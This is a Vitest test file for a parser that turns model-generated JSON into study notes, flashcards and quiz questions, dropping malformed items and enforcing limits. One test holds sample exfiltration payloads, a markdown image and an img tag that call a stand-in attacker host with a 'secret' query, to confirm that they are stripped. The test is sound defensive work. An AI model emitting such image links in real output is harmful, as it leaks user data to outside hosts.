import { describe, expect, it } from "vitest";
import { parseSectionReply, UnreadableReplyError } from "./parse";

const LIMITS = { notes: 10, cards: 20, questions: 20 };
const quote = "Mitochondria are the site of aerobic respiration in the cell";

describe("parseSectionReply", () => {
  it("keeps valid items and drops malformed ones without failing the section", () => {
    const reply = JSON.stringify({
      notes: [{ heading: "Respiration", page: 2, points: ["Aerobic", 7, ""] }, { heading: "" }],
      cards: [
        { front: "Where does aerobic respiration happen?", back: "In mitochondria", page: 2, quote },
        { front: "Missing back", page: 2, quote },
        { front: "No quote", back: "x", page: 2 },
        "not an object",
      ],
      questions: [
        { kind: "mcq", prompt: "Site of aerobic respiration?", choices: ["Nucleus", "Mitochondria", "Ribosome", "Golgi"], answerIndex: 1, page: "2", quote },
        { kind: "mcq", prompt: "Dup choices", choices: ["A", "a", "B", "C"], answerIndex: 0, page: 2, quote },
        { kind: "mcq", prompt: "Out of range", choices: ["A", "B", "C", "D"], answerIndex: 4, page: 2, quote },
        { kind: "mcq", prompt: "Meta", choices: ["A", "B", "C", "All of the above"], answerIndex: 3, page: 2, quote },
        { kind: "true_false", prompt: "Mitochondria respire.", answerBool: "true", page: 2, quote },
        { kind: "short", prompt: "Name the organelle.", answerText: "Mitochondrion", page: 2, quote },
        { kind: "essay", prompt: "Unknown kind", page: 2, quote },
      ],
    });
    const parsed = parseSectionReply(reply, LIMITS);
    expect(parsed.notes).toEqual([{ heading: "Respiration", page: 2, points: ["Aerobic"] }]);
    expect(parsed.cards).toHaveLength(1);
    expect(parsed.questions.map((q) => q.kind)).toEqual(["mcq", "true_false", "short"]);
    expect(parsed.questions[0]).toMatchObject({ answerIndex: 1, page: 2 });
    expect(parsed.questions[1].answerBool).toBe(true);
    expect(parsed.malformed).toBe(1 + 3 + 4);
  });

  it("reads a reply wrapped in a code fence or prose", () => {
    const body = JSON.stringify({ cards: [{ front: "Q?", back: "A", page: 1, quote }] });
    expect(parseSectionReply("```json\n" + body + "\n```", LIMITS).cards).toHaveLength(1);
    expect(parseSectionReply("Here you go:\n" + body, LIMITS).cards).toHaveLength(1);
  });

  it("throws only when there is no JSON object at all", () => {
    expect(() => parseSectionReply("I cannot help with that.", LIMITS)).toThrow(UnreadableReplyError);
    expect(() => parseSectionReply('["a list"]', LIMITS)).toThrow(UnreadableReplyError);
    expect(parseSectionReply("{}", LIMITS)).toEqual({ notes: [], cards: [], questions: [], malformed: 0 });
  });

  it("reads at most the limit of each kind", () => {
    const cards = Array.from({ length: 50 }, (_, i) => ({ front: `Q${i}?`, back: "A", page: 1, quote }));
    expect(parseSectionReply(JSON.stringify({ cards }), { ...LIMITS, cards: 5 }).cards).toHaveLength(5);
  });

  it("removes images from generated text (no fetches to model-chosen URLs)", () => {
    const reply = JSON.stringify({
      cards: [{ front: "Q ![x](https://evil.example/?d=secret) here", back: 'A <img src="https://evil.example/a.png">', page: 1, quote }],
    });
    const [card] = parseSectionReply(reply, LIMITS).cards;
    expect(card.front).toBe("Q here");
    expect(card.back).toBe("A");
  });
});
